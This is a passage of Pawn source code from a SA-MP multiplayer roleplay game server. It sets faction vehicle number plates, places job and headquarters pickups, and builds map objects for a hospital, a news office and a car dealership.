	    format(nrinmatric, sizeof(nrinmatric), "{668573}GROV - 0%d", i);
	    SetVehicleNumberPlate(Grovec[i], nrinmatric);
	    SetVehicleToRespawn(Grovec[i]);
	}
	for(new i = 0; i < sizeof(Vagosc); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{2F2F2F}LVA - 0%d", i);
	    SetVehicleNumberPlate(Vagosc[i], nrinmatric);
	    SetVehicleToRespawn(Vagosc[i]);
	}
	for(new i = 0; i < sizeof(Ballasc); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{885724}BAL - 0%d", i);
	    SetVehicleNumberPlate(Ballasc[i], nrinmatric);
	    SetVehicleToRespawn(Ballasc[i]);
	}
	for(new i = 0; i < sizeof(news); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{FFABFC}NR - 0%d", i);
	    SetVehicleNumberPlate(news[i], nrinmatric);
	    SetVehicleToRespawn(news[i]);
	}
	for(new i = 0; i < sizeof(towcar); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{FFFFA8}TCC - 0%d", i);
	    SetVehicleNumberPlate(towcar[i], nrinmatric);
	    SetVehicleToRespawn(towcar[i]);
	}
	for(new i = 0; i < sizeof(taxic); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{fcff00}TAXI - 0%d", i);
	    SetVehicleNumberPlate(taxic[i], nrinmatric);
	    SetVehicleToRespawn(taxic[i]);
	}
	for(new i = 0; i < sizeof(si); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{10E056}SI - 0%d", i);
	    SetVehicleNumberPlate(si[i], nrinmatric);
	    SetVehicleToRespawn(si[i]);
	}
	for(new i = 0; i < sizeof(ambcars); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{FF0033}AMB - 0%d", i);
	    SetVehicleNumberPlate(ambcars[i], nrinmatric);
	    SetVehicleToRespawn(ambcars[i]);
	}
	for(new i = 0; i < sizeof(bus); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{FF0033}BUS - 0%d", i);
	    SetVehicleNumberPlate(bus[i], nrinmatric);
	    SetVehicleToRespawn(bus[i]);
	}
	for(new i = 0; i < sizeof(bus); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{FF0033}BUS - 0%d", i);
	    SetVehicleNumberPlate(bus[i], nrinmatric);
	    SetVehicleToRespawn(bus[i]);
	}
	for(new i = 0; i < sizeof(rentls); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{FF0033}RNT - 0%d", i);
	    SetVehicleNumberPlate(rentls[i], nrinmatric);
	    SetVehicleToRespawn(rentls[i]);
	}
	for(new i = 0; i < sizeof(masinils); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{FF0033}LS - %d", i);
	    SetVehicleNumberPlate(masinils[i], nrinmatric);
	    SetVehicleToRespawn(masinils[i]);
	}
	for(new i = 0; i < sizeof(masinilv); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{FF0033}LV - %d", i);
	    SetVehicleNumberPlate(masinilv[i], nrinmatric);
	    SetVehicleToRespawn(masinilv[i]);
	}
	for(new i = 0; i < sizeof(thea); i++)
	{
	    format(nrinmatric, sizeof(nrinmatric), "{CC0000}HIT - 0%d", i);
	    SetVehicleNumberPlate(thea[i], nrinmatric);
	    SetVehicleToRespawn(thea[i]);
	}

	// Pickups
	pickuph = CreatePickup(1316, 23, 1059.6315,-344.6857,73.9922); 		// Order pickup Hitman Garage
	AddStaticPickup(1240, 23, 1614.92480, 1816.09631, 10.91310); 		// Hospital 1 near Ammu
	AddStaticPickup(1239, 23, 2029.5945,-1404.6426,17.2512); 			// Hospital 2 near speedway
	AddStaticPickup(1242, 23, 1527.5,-12.1,1002.0); 					// binco armor
	AddStaticPickup(1239, 23, 388.5289,-1524.0131,32.2734); 			// Driving License
	porp = CreatePickup(1254, 23, 2495.3271,-1690.6740,14.7656); 		// Grove Street Hq
	trdp = CreatePickup(1254, 23, 1456.7423,2773.3423,10.8203); 		// Los Aztecas Hq
	medickase = CreatePickup(11738,23, 1172.55933,-1320.73059, 15.04141); ///medic elevator
	sicp = CreatePickup(1254, 23, 725.6769,-1440.4506,13.5391); 		// Los Vagos HQ
	rusp = CreatePickup(1254, 23, 1455.2687,750.8684,11.0234); 		    // Ballas HQ
	gslsenter1 = CreatePickup(1318, 23, 305.9341,-141.7895,1004.0547, -1);
	gslsenter2 = CreatePickup(1318, 23, 300.1486,-141.8312,1004.0625, -1);
	gslsenter3 = CreatePickup(1318, 23, 304.0917,-141.7523,1004.0625, -1);
	gslsenter4 = CreatePickup(1318, 23, 298.9318,-141.8459,1004.0547, -1);
	AddStaticPickup(1275, 23, -76.8129,-1136.6630,1.0781);              // Trucker [/getjob]
    AddStaticPickup(1247, 23, 1554.7621,-1675.5870,16.1953);			// Lspd
    AddStaticPickup(1247, 23, 2287.1047,2431.7996,10.8203);				// Lvpd
    AddStaticPickup(1314, 23, 2282.1289,2425.7620,3.4692);				// Lvpd arrest
    AddStaticPickup(1314, 23, 1526.3739,-1678.0635,5.8906);				// Lspd arrest
    AddStaticPickup(1247, 23, 627.6160,-571.7920,17.6242);				// Fbi
	//govp = CreatePickup(1239, 23, 1481.2347,-1771.1429,18.7958);		// Guvern
	AddStaticPickup(1239, 23, 1756.4181,-1577.8954,1742.5309);			// exit jail
	AddStaticPickup(1239, 23, 1762.0028,-1584.4185,1742.5264);			// mdc jail
	AddStaticPickup(1275, 23, 1365.8931,-1289.0779,13.5469);			// GETJOB ARMS DEALER
    AddStaticPickup(1275, 23, 2165.5444,-1674.6372,15.0822);			// GETJOB DRUGS DEALER
	AddStaticPickup(1275, 23, 2503.0581,2778.7229,10.8203);			    // GETJOB GARBAGE MAN
	AddStaticPickup(1275, 23, 1474.2523,-1771.2463,18.7958);				// GETJOB DETECTIVE
	AddStaticPickup(1275, 23, 910.8003,-1231.9697,16.9766); 			// GETJOB MECHANIC
	AddStaticPickup(1275, 23, 2850.9663,891.8728,10.7500); 			// GETJOB CAR JACKER
	AddStaticPickup(1239, 23, 2770.4629,-1628.3237,12.1775); 			// MATSCOLLECT
	AddStaticPickup(1239, 23, 2065.4844,-1584.0730,13.4821); 			// BUYIRON
	AddStaticPickup(1239, 23, 5.7771,-3989.8794,1003.5266); 			// STATION LS BUY
	sip = CreatePickup(1239, 23, 2435.3064,1671.0139,10.8203); 			// SI
	AddStaticPickup(1239, 23, 157.3923,1903.2848,18.6660); 				// NG ARMOURY
	taxip = CreatePickup(1239, 23, 1754.4260,-1894.0844,13.5569); 		// TAXI HQ
	AddStaticPickup(1275, 23, 2123.0237,-1788.8237,13.5547); 			// PIZZA BOY
	AddStaticPickup(1275, 23, 1154.3644,-1181.1787,32.8187); 			// CURIER GETJOB
	AddStaticPickup(1275, 23, 816.6126,857.0764,12.7891); 			// TRANSPORTATOR DE CIMENT GETJOB
	AddStaticPickup(1275, 23, 1972.4215,-1358.8444,14.1548); 			// Muncitor in Cariera GETJOB
	AddStaticPickup(1275, 23, 840.9308,-2066.2319,12.8672); 			// FISH GETJOB
	AddStaticPickup(1275, 23, -44.8344,-1560.9879,2.6009); 				// GETJOB TRUCKER
	AddStaticPickup(1275, 23, 1450.3951,-2286.9661,13.5469); 			// GETJOB BUS DRIVER
	hitmanep = CreatePickup(1239, 23, 1081.1794,-345.3979,73.9825); 	// HITMAN ENTER
	AddStaticPickup(1239, 23, 2166.4771,-1671.7883,15.0743); 			// DRUGS HOUSE
	AddStaticPickup(1316, 23, 1594.7660,-1619.7109,13.4093);            // GARAGE ENTER PD
	AddStaticPickup(1316, 23, 1292.7828,6.8377,1001.0078);       		// GARAGE EXIT PD
	AddStaticPickup(1277, 23, 893.71094, -1636.59204, 14.72620);       	// HQ STAFF
	AddStaticPickup(1254, 23, 1154.4122,-1440.0548,15.7969);       	    // PAINTBALL LS
	AddStaticPickup(1314, 23, 1765.1915,-1767.0513,13.7606);       	    // BISERICA LS

	//CreateDynamicPickup(modelid, type, Float:x, Float:y, Float:z, worldid = -1, interiorid = -1, playerid = -1, Float:streamdistance = 100.0);
	CreateDynamicPickup(1247, 23, 242.4025,66.4760,1003.6406,-1,-1,-1,100.0); // LSPD STAFF HQ
	CreateDynamicPickup(1316, 23, 1292.7828,6.8377,1001.0078,676,18,-1,100.0); // GARAGE EXIT HITMAN
	CreateDynamicPickup(1279, 23, 322.9745,1119.4409,1083.8828,-1,-1,-1,100.0);
	CreateDynamicPickup(1275, 23, -382.8534,-1426.2845,26.2880,-1,-1,-1,100.0);
	CreateDynamicPickup(1239, 23, 918.6766,-1252.2185,16.2109,-1,-1,-1,100.0);
	CreateDynamicPickup(1277, 23, 1574.8773,-1274.0566,17.6131,-1,-1,-1,100.0);  // DS PiCKUP
	CreateDynamicPickup(1239, 23, 1564.8662,-1666.4962,28.3956,-1,-1,-1,100.0); // LSPD Roff(sus)
	CreateDynamicPickup(1239, 23, 1568.5825,-1690.2802,5.8906,-1,-1,-1,100.0); // LSPD Roff(jos)
	CreateDynamicPickup(1239, 23, 2340.2810,2456.5625,14.9688,-1,-1,-1,100.0); // LVPD Roff(jos)
	CreateDynamicPickup(1239, 23, 2339.3237,2461.2197,38.6837,-1,-1,-1,100.0); // LVPD Roff(sus)
	CreateDynamicPickup(1239, 23, 229.4171,167.4609,1003.0234,-1,-1,-1,100.0); 	// clear fbi
	CreateDynamicPickup(1239, 23,187.8352,1931.4265,17.6874,-1,-1,-1,100.0); 	// clear ng
	CreateDynamicPickup(1239, 23,-329.5258,1536.7759,76.6117,-1,-1,-1,100.0); 	// nr
	CreateDynamicPickup(371, 23,-2231.2058,-1736.1578,480.8620,-1,-1,-1,100.0); // parachute
	//CreateDynamicPickup(1239, 23,1449.2723,-1848.4255,13.7721,-1,-1,-1,100.0); 	// buymaterials
	CreateDynamicPickup(1239, 23,1510.3986,-1059.5723,25.0625,-1,-1,-1,100.0); 	// event area enter
	CreateDynamicPickup(1239, 23,-1423.5153,935.8321,1036.4756,-1,-1,-1,100.0); // event area exit
	CreateDynamicPickup(1274, 23, 256.9322,64.7314,1003.6406, -1, -1,-1,100.0);
	
	//MINGE
		//////hospital map
	CreateObject(19912, 1154.83594, -1291.03210, 13.99554,   0.00000, 0.00000, 0.00000);
	//CreateObject(19912, 1143.88892, -1291.10461, 13.99554,   0.00000, 0.00000, 0.00000);
	CreateObject(4515, 1144.14978, -1362.85852, 14.44316,   0.00000, 0.00000, 0.00000);
	CreateObject(4507, 1089.01746, -1362.77979, 16.35970,   0.00000, 0.00000, 0.00000);

	//Nr map
	CreateObject(19462, -1778.95825, -3546.96802, 339.70706,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1778.96936, -3556.42505, 339.70706,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1768.82495, -3546.98193, 339.70706,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1779.06702, -3547.08252, 343.11761,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1778.83252, -3575.06860, 343.11761,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1779.01123, -3566.14087, 343.11761,   0.30000, 0.66000, 0.00000);
CreateObject(19462, -1779.01917, -3556.53076, 343.11761,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1773.57605, -3580.34888, 339.70706,   0.00000, 0.00000, 88.01997);
CreateObject(19462, -1777.46875, -3575.41553, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1777.46143, -3568.16992, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1777.38171, -3559.48633, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1777.39514, -3550.52393, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1777.36121, -3546.99805, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1773.89441, -3547.04053, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1773.93628, -3555.61060, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1770.63232, -3575.59229, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1773.98291, -3563.59814, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1770.68921, -3547.00903, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1774.00903, -3575.48096, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1774.04443, -3572.82251, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1770.64270, -3572.50073, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1770.65918, -3566.12988, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1770.61267, -3556.65039, 337.91055,   0.42000, 89.21996, 0.00000);
CreateObject(19462, -1768.78015, -3576.03271, 339.70706,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1772.83679, -3542.28540, 339.70706,   0.00000, 0.00000, 88.01997);
CreateObject(19462, -1778.73975, -3575.12329, 339.70706,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1778.86255, -3565.48999, 339.70706,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1768.84204, -3566.47803, 339.70706,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1768.74768, -3556.99805, 339.70706,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1768.84265, -3547.80347, 339.70706,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1768.82495, -3546.98193, 343.20047,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1768.72302, -3556.59570, 343.20050,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1768.81982, -3566.07568, 343.16174,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1768.74023, -3575.67358, 343.12595,   0.00000, 0.00000, 0.00000);
CreateObject(19462, -1773.18506, -3580.46997, 343.07559,   0.00000, 0.00000, 88.01997);
CreateObject(19462, -1774.14990, -3580.16357, 343.07559,   0.00000, 0.00000, 88.01997);
CreateObject(19462, -1774.14990, -3580.16357, 339.70706,   0.00000, 0.00000, 88.01997);
CreateObject(19462, -1774.10876, -3542.25439, 339.70706,   0.00000, 0.00000, 88.01997);
CreateObject(19462, -1772.83679, -3542.28540, 343.21484,   0.00000, 0.00000, 88.01997);
CreateObject(19462, -1774.10876, -3542.25439, 343.05832,   0.00000, 0.00000, 88.01997);
CreateObject(2161, -1778.20850, -3568.09204, 337.96130,   0.00000, 0.00000, -90.24000);
CreateObject(2161, -1778.20752, -3569.36426, 337.96130,   0.00000, 0.00000, -90.24000);
CreateObject(2161, -1778.20850, -3569.35254, 339.35690,   0.00000, 0.00000, -90.24000);
CreateObject(2161, -1778.20850, -3568.09204, 339.35690,   0.00000, 0.00000, -90.24000);
CreateObject(1742, -1778.41553, -3572.64844, 338.07199,   0.00000, 0.00000, 90.00000);
CreateObject(1742, -1778.52075, -3571.32642, 338.07199,   0.00000, 0.00000, 90.00000);
CreateObject(1742, -1778.64624, -3572.81934, 339.36786,   0.00000, 0.00000, 90.00000);
CreateObject(1742, -1778.52075, -3571.32642, 339.36786,   0.00000, 0.00000, 90.00000);
CreateObject(2059, -1772.17688, -3573.66089, 338.04062,   0.00000, 0.00000, 0.00000);
CreateObject(2059, -1771.04932, -3575.19287, 338.04062,   0.00000, 0.00000, 0.00000);
CreateObject(2059, -1773.12390, -3575.02881, 338.04062,   0.00000, 0.00000, 0.00000);
CreateObject(2059, -1774.72449, -3572.65332, 338.04062,   0.00000, 0.00000, 0.00000);
CreateObject(2059, -1772.36499, -3572.47998, 338.04062,   0.00000, 0.00000, 0.00000);
CreateObject(2059, -1769.71936, -3569.50293, 338.93924,   0.00000, 0.00000, 0.00000);
CreateObject(2165, -1777.48242, -3579.16748, 337.98383,   0.00000, 0.00000, 0.00000);
CreateObject(2165, -1770.78113, -3579.35010, 337.98383,   0.00000, 0.00000, 0.00000);
CreateObject(2165, -1774.26404, -3579.24731, 337.98383,   0.00000, 0.00000, 0.00000);
CreateObject(2181, -1769.55969, -3568.53345, 338.04422,   0.00000, 0.00000, -93.96000);
CreateObject(2059, -1770.80029, -3573.76978, 338.04062,   0.00000, 0.00000, 0.00000);
CreateObject(11682, -1778.17090, -3563.21021, 337.96741,   0.00000, 0.00000, -546.29999);
CreateObject(11682, -1778.01086, -3562.33398, 337.96741,   0.00000, 0.00000, -272.22003);
CreateObject(2808, -1778.19629, -3565.16943, 338.67749,   0.00000, 0.00000, -89.52000);
CreateObject(19860, -1778.85815, -3546.68530, 339.17227,   0.00000, 0.00000, -80.15999);

	//DealerShip MAP #3
	
	new Conce1= CreateObject(19354, 1574.9298, -1274.9865, 23.4190,   0.00000, 0.00000, 90.00000, 300.00);
	SetObjectMaterialText(Conce1, "{FFFFFF}d", 0, OBJECT_MATERIAL_SIZE_128x64, "Webdings", 70, 1, 0xffffffff, 0, 1);
	new Conce0= CreateObject(19327, 1574.92029, -1275.09106, 23.40990,   0.00000, 0.00000, 0.00000, 300.00);
	SetObjectMaterialText(Conce0, "{DEB887}&", 0, OBJECT_MATERIAL_SIZE_128x64, "Webdings", 90, 1, 0xffffffff, 0, 1);
	new ConceLogo= CreateObject(19354, 1574.92981, -1274.98645, 21.2365,   0.00000, 0.00000, 90.00000, 300.00);
	SetObjectMaterialText(ConceLogo, "{FFFFFF}Dealership", 0, OBJECT_MATERIAL_SIZE_256x128, "Arial", 50, 1, 0xfff0f0f0, 0, 1);
	new Conce= CreateObject(4562, 1574.59375, -1248.10156, 15.39840,   0.00000, 0.00000, 0.00000, 300.00);
	SetObjectMaterial(Conce, 0,  6487, "councl_law2", "Grass_lawn_128HV");
	SetObjectMaterial(Conce, 1,  4550, "skyscr1_lan2", "sl_skyscprwall1");
	Vidro[0]= CreateObject(19325, 1562.53503, -1273.52515, 18.32838,   0.00000, 0.00000, 90.00000, 300.00);
	Vidro[1]= CreateObject(19325, 1569.15845, -1273.51404, 18.32840,   0.00000, 0.00000, 90.00000, 300.00);
	Vidro[2]= CreateObject(19325, 1575.79224, -1273.52087, 18.32840,   0.00000, 0.00000, 90.00000, 300.00);
	Vidro[3]= CreateObject(19325, 1582.43054, -1273.52087, 18.32840,   0.00000, 0.00000, 90.00000, 300.00);
	Vidro[4]= CreateObject(19325, 1586.89673, -1273.52002, 18.32840,   0.00000, 0.00000, 90.00000, 300.00);
	Vidro[5]= CreateObject(19325, 1593.60913, -1271.00305, 18.32840,   0.00000, 0.00000, 135.00000, 300.00);
	Vidro[6]= CreateObject(19325, 1555.78918, -1270.9184, 18.32840,   0.00000, 0.00000, 45.00000, 300.00);
	for(new i = 0; i != 7; i++) SetObjectMaterial(Vidro[i],0,18065, "ab_sfammumain", "shelf_glas");
	Textura0[0]= CreateObject(18766, 1566.69189, -1273.71155, 15.19370,   0.00000, 0.00000, 0.00000, 300.00);
	Textura0[1]= CreateObject(18766, 1564.24902, -1273.73120, 15.19370,   0.00000, 0.00000, 0.00000, 300.00);
	Textura0[2]= CreateObject(18980, 1558.77612, -1273.72253, 5.18040,   0.00000, 0.00000, 0.00000, 300.00);
	Textura0[3]= CreateObject(18980, 1558.58667, -1273.71497, 5.16040,   0.00000, 0.00000, 1.15870, 300.00);
	Textura0[4]= CreateObject(18762, 1556.68579, -1272.10742, 17.18120,   0.00000, 90.00000, 135.00000, 300.00);
	Textura0[5]= CreateObject(18762, 1555.29834, -1270.73462, 17.18120,   0.00000, 90.00000, 135.00000, 300.00);
	Textura0[6]= CreateObject(18762, 1550.79529, -1268.88696, 17.19850,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[7]= CreateObject(18762, 1549.92236, -1268.90320, 17.19850,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[8]= CreateObject(18766, 1547.91895, -1263.44604, 15.18390,   0.00000, 0.00000, 90.00000, 300.00);
	Textura0[9]= CreateObject(18766, 1547.92236, -1253.47119, 15.18390,   0.00000, 0.00000, 90.00000, 300.00);
	Textura0[10]= CreateObject(18766, 1547.93640, -1248.32874, 15.18390,   0.00000, 0.00000, 90.00000, 300.00);
	Textura0[11]= CreateObject(18981, 1560.78601, -1243.82544, 5.17470,   0.00000, 0.00000, 90.00000, 300.00);
	Textura0[12]= CreateObject(18981, 1566.11450, -1243.86365, 5.17470,   0.00000, 0.00000, 90.00000, 300.00);
	Textura0[13]= CreateObject(18766, 1584.30713, -1243.84912, 12.45540,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[14]= CreateObject(18766, 1584.67041, -1243.82556, 12.45540,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[15]= CreateObject(18766, 1595.32983, -1243.88550, 14.95520,   0.00000, 0.00000, 0.00000, 300.00);
	Textura0[16]= CreateObject(18766, 1597.00854, -1243.84143, 14.95520,   0.00000, 0.00000, 0.00000, 300.00);
	Textura0[17]= CreateObject(18766, 1601.52283, -1249.31885, 14.95520,   0.00000, 0.00000, 90.00000, 300.00);
	Textura0[18]= CreateObject(18766, 1601.51929, -1259.30554, 14.95520,   0.00000, 0.00000, 90.00000, 300.00);
	Textura0[19]= CreateObject(18766, 1601.52466, -1264.33484, 14.95520,   0.00000, 0.00000, 90.00000, 300.00);
	Textura0[20]= CreateObject(18762, 1598.59167, -1268.82996, 16.93960,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[21]= CreateObject(18762, 1594.13379, -1270.77673, 16.93960,   0.00000, 90.00000, 45.00000, 300.00);
	Textura0[22]= CreateObject(18762, 1592.76013, -1272.13794, 16.93960,   0.00000, 90.00000, 45.00000, 300.00);
	Textura0[23]= CreateObject(18766, 1586.33984, -1273.73499, 15.19370,   0.00000, 0.00000, 0.00000, 300.00);
	Textura0[24]= CreateObject(18766, 1583.15247, -1273.78137, 15.19340,   0.00000, 0.00000, 0.00000, 300.00);
	TexturaC[0]= CreateObject(19446, 1563.01355, -1273.86377, 24.27450,   0.00000, 0.00000, 90.00000, 300.00);
	TexturaC[1]= CreateObject(19446, 1572.64319, -1273.86609, 24.27450,   0.00000, 0.00000, 90.00000, 300.00);
	TexturaC[2]= CreateObject(19446, 1582.26013, -1273.87585, 24.27450,   0.00000, 0.00000, 90.00000, 300.00);
	TexturaC[3]= CreateObject(19446, 1586.42102, -1273.86267, 24.27450,   0.00000, 0.00000, 90.00000, 300.00);
	TexturaC[4]= CreateObject(19446, 1563.01355, -1273.86353, 21.83500,   0.00000, 0.00000, 90.00000, 300.00);
	TexturaC[5]= CreateObject(19446, 1572.64319, -1273.86511, 21.83500,   0.00000, 0.00000, 90.00000, 300.00);
	TexturaC[6]= CreateObject(19446, 1582.26013, -1273.87537, 21.83500,   0.00000, 0.00000, 90.00000, 300.00);
	TexturaC[7]= CreateObject(19446, 1586.44104, -1273.86243, 21.83500,   0.00000, 0.00000, 90.00000, 300.00);
	for(new i = 0; i != 8; i++) SetObjectMaterial(TexturaC[i],0,8555, "vgsdwntwn2", "excaliburwall02_128", 0xFFDEB887);
	Textura2[0]= CreateObject(19354, 1557.10754, -1272.77258, 21.8550,   0.00000, 0.00000, 45.00000, 300.00);
	Textura2[1]= CreateObject(19354, 1557.10754, -1272.77197, 23.85610,   0.00000, 0.00000, 45.00000, 300.00);
	Textura2[2]= CreateObject(19354, 1554.88647, -1270.52197, 21.8550,   0.00000, 0.00000, 45.00000, 300.00);
	Textura2[3]= CreateObject(19354, 1554.91809, -1270.54895, 23.85610,   0.00000, 0.00000, 45.00000, 300.00);
	Textura2[4]= CreateObject(19354, 1554.57446, -1270.21167, 21.8550,   0.00000, 0.00000, 45.00000, 300.00);
	Textura2[5]= CreateObject(19354, 1554.57446, -1270.21143, 23.79510,   0.00000, 0.00000, 45.00000, 300.00);
	Textura2[6]= CreateObject(19354, 1552.66455, -1269.11133, 21.16724,   0.00000, 0.00000, 90.00000, 300.00);
	Textura2[7]= CreateObject(19354, 1552.66455, -1269.11133, 17.69830,   0.00000, 0.00000, 90.00000, 300.00);
	Textura2[8]= CreateObject(19354, 1549.46423, -1269.09558, 17.69830,   0.00000, 0.00000, 90.00000, 300.00);
	Textura2[9]= CreateObject(19354, 1549.46423, -1269.09558, 21.17420,   0.00000, 0.00000, 90.00000, 300.00);
	Textura2[10]= CreateObject(19377, 1547.76990, -1264.32166, 18.22230,   0.00000, 0.00000, 0.00000, 300.00);
	Textura2[11]= CreateObject(19377, 1547.77856, -1254.72583, 18.22230,   0.00000, 0.00000, 0.00000, 300.00);
	Textura2[12]= CreateObject(19377, 1547.77441, -1248.42896, 18.22230,   0.00000, 0.00000, 0.00000, 300.00);
	Textura2[13]= CreateObject(19377, 1552.51477, -1243.68628, 18.22230,   0.00000, 0.00000, 90.00000, 300.00);
	Textura2[14]= CreateObject(19377, 1562.11877, -1243.67102, 18.22230,   0.00000, 0.00000, 90.00000, 300.00);
	Textura2[15]= CreateObject(19377, 1571.70459, -1243.67334, 18.22230,   0.00000, 0.00000, 90.00000, 300.00);
	Textura2[16]= CreateObject(19377, 1581.28503, -1243.67102, 18.22230,   0.00000, 0.00000, 90.00000, 300.00);
	Textura2[17]= CreateObject(19377, 1590.51379, -1243.67688, 18.22230,   0.00000, 0.00000, 90.00000, 300.00);
	Textura2[18]= CreateObject(19377, 1596.91467, -1243.67493, 18.22230,   0.00000, 0.00000, 90.00000, 300.00);
	Textura2[19]= CreateObject(19377, 1601.67981, -1248.40076, 18.22230,   0.00000, 0.00000, 0.00000, 300.00);
	Textura2[20]= CreateObject(19377, 1601.67285, -1258.02112, 18.22230,   0.00000, 0.00000, 0.00000, 300.00);
	Textura2[21]= CreateObject(19377, 1601.67249, -1264.25989, 18.22230,   0.00000, 0.00000, 0.00000, 300.00);
	Textura2[22]= CreateObject(19354, 1599.98279, -1269.01672, 21.71560,   0.00000, 0.00000, 90.00000, 300.00);
	Textura2[23]= CreateObject(19354, 1599.98279, -1269.01672, 18.22650,   0.00000, 0.00000, 90.00000, 300.00);
	Textura2[24]= CreateObject(19354, 1596.85889, -1269.01672, 18.22650,   0.00000, 0.00000, 90.00000, 300.00);
	Textura2[25]= CreateObject(19354, 1596.85889, -1269.01672, 21.72510,   0.00000, 0.00000, 90.00000, 300.00);
	Textura2[26]= CreateObject(19354, 1592.30396, -1272.79346, 24.10570,   0.00000, 0.00000, 135.00000, 300.00);
	Textura2[27]= CreateObject(19354, 1594.49414, -1270.58911, 24.10570,   0.00000, 0.00000, 135.00000, 300.00);
	Textura2[28]= CreateObject(19354, 1594.87915, -1270.21497, 24.10570,   0.00000, 0.00000, 135.00000, 300.00);
	Textura2[29]= CreateObject(19354, 1592.30396, -1272.79297, 21.83500,   0.00000, 0.00000, 135.00000, 300.00);
	Textura2[30]= CreateObject(19354, 1594.49414, -1270.58899, 21.83500,   0.00000, 0.00000, 135.00000, 300.00);
	Textura2[31]= CreateObject(19354, 1594.87915, -1270.20996, 21.83500,   0.00000, 0.00000, 135.00000, 300.00);
	Textura2[32]= CreateObject(19692, 1574.80164, -1273.73865, 23.18730,   0.00000, 90.00000, 90.00000, 300.00);
	Textura2[33]= CreateObject(19354, 1558.27271, -1271.62097, 22.76505,   0.00000, 90.00000, 45.00000, 300.00);
	Textura2[34]= CreateObject(19354, 1556.03564, -1269.42456, 22.76505,   0.00000, 90.00000, 45.00000, 300.00);
	Textura2[35]= CreateObject(19446, 1562.97839, -1272.24121, 22.76400,   0.00000, 90.00000, 90.00000, 300.00);
	Textura2[36]= CreateObject(19446, 1564.51196, -1272.21082, 22.76400,   0.00000, 90.00000, 90.00000, 300.00);
	Textura2[37]= CreateObject(19446, 1585.21692, -1272.24219, 22.76400,   0.00000, 90.00000, 90.00000, 300.00);
	Textura2[38]= CreateObject(19446, 1586.41296, -1272.23572, 22.76400,   0.00000, 90.00000, 90.00000, 300.00);
	Textura2[39]= CreateObject(19354, 1591.13257, -1271.69434, 22.77200,   0.00000, 90.00000, 135.0000, 300.000);
	Textura2[40]= CreateObject(19354, 1593.35657, -1269.44885, 22.78200,   0.00000, 90.00000, 135.00000, 300.00);
	for(new i = 0; i != 41; i++) SetObjectMaterial(Textura2[i],0,8678, "wddngchplgrnd01", "vgschurchwall05_128", 0xFFFF0000);
	Textura0[25]= CreateObject(18980, 1590.73511, -1273.46216, 7.64735,   0.00000, 0.00000, 0.00000, 300.00);
	Textura0[26]= CreateObject(18980, 1591.23962, -1273.26819, 7.64740,   0.00000, 0.00000, 135.00000, 300.00);
	Textura0[27]= CreateObject(18980, 1558.70386, -1273.47705, 7.61050,   0.00000, 0.00000, 0.00000, 300.00);
	Textura0[28]= CreateObject(18980, 1558.20154, -1273.25842, 7.61050,   0.00000, 0.00000, 45.00000, 300.00);
	Textura0[29]= CreateObject(18762, 1550.79529, -1268.88696, 23.41312,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[30]= CreateObject(18762, 1549.92236, -1268.90320, 23.41340,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[31]= CreateObject(18766, 1549.91760, -1263.42871, 23.41030,   -90.00000, 0.00000, 90.00000, 300.00);
	Textura0[32]= CreateObject(18766, 1549.91479, -1253.50134, 23.41030,   -90.00000, 0.00000, 90.00000, 300.00);
	Textura0[33]= CreateObject(18766, 1549.91821, -1248.21802, 23.41030,   -90.00000, 0.00000, 90.00000, 300.00);
	Textura0[34]= CreateObject(18980, 1564.80872, -1243.70239, 23.41360,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[35]= CreateObject(18980, 1589.73389, -1243.70837, 23.41360,   0.00000, 90.00000, 0.00000, 300.00);
	Textura0[36]= CreateObject(18766, 1599.72327, -1249.08740, 23.41030,   -90.00000, 0.00000, 90.00000, 300.00);
	Textura0[37]= CreateObject(18766, 1599.72327, -1253.50134, 23.41030,   -90.00000, 0.00000, 90.00000, 300.00);
